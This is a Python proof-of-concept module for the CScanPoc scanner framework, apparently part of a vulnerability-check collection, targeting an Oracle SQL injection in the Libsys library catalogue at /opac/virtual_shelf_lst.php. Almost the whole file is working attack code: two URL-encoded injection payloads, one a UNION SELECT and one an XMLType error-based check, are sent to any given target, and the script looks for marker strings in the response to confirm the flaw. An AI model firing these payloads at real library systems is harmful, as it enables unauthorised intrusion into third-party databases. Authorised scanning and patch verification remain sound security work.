# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Libsys_0014' # 平台漏洞编号，留空
    name = '汇文软件图书检索系统 Oracle盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-30'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）汇文软件图书检索系统Oracle盲注。
        /opac/virtual_shelf_lst.php?CLASS_ID=1
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '33698465-4406-4302-a923-71539a4b199d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2015-0129800
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/opac/virtual_shelf_lst.php?CLASS_ID=1'
            getdata = '%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%7C%7CCHR%28121%29%7C%7CCHR%2890%29%7C%7CCHR%28122%29%7C%7CCHR%28117%29%7C%7CCHR%2885%29%7C%7CCHR%2884%29%7C%7CCHR%28121%29%7C%7CCHR%2888%29%7C%7CCHR%2868%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
            code, head, res, errcode, _ = hh.http(arg + payload + getdata)

            if code == 200 and 'qzkqqgyZzuUTyXDqkvvq' in res :
                #security_hole(arg + payload + '  :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                return

                
            getdata = '%27%20AND%206565%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286565%3D6565%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27KxlF%27%3D%27KxlF'
            code, head, res, errcode, _ = hh.http(arg + payload + getdata)

            if code == 200 and 'qqzkq1qkzvq' in res :
                #security_hole(arg + payload + '  :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
